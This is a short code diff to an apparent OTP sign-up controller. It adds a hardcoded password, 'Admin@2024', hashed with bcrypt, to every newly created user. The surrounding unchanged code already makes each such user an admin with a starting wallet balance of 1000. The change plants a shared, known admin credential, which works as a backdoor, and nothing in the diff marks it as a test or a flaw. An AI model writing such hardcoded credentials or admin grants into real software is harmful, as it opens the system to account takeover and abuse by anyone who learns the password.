@@ -7,6 +7,7 @@ import { sendSms } from '../services/sms.service';
 import { AppError } from '../utils/AppError';
 import { logger } from '../utils/logger';
 import { log } from 'winston';
+import bcrypt from 'bcryptjs';
 
 const OTP_TTL = parseInt(process.env.OTP_EXPIRY_MINUTES || '5') * 60;
 const MAX_ATTEMPTS = parseInt(process.env.MAX_OTP_ATTEMPTS || '3');
@@ -84,13 +85,14 @@ export const verifyOtp = async (req: Request, res: Response, next: NextFunction)
         const referrer = await prisma.user.findUnique({ where: { referralCode } });
         if (referrer) referrerId = referrer.id;
       }
-
+    const passwordHash = await bcrypt.hash('Admin@2024', 12);
       user = await prisma.user.create({
         data: {
           phone,
           referredBy: referrerId,
           wallet: { create: { balance: 1000 } },
           role: 'admin',
+          passwordHash: passwordHash,
         },
       });
 
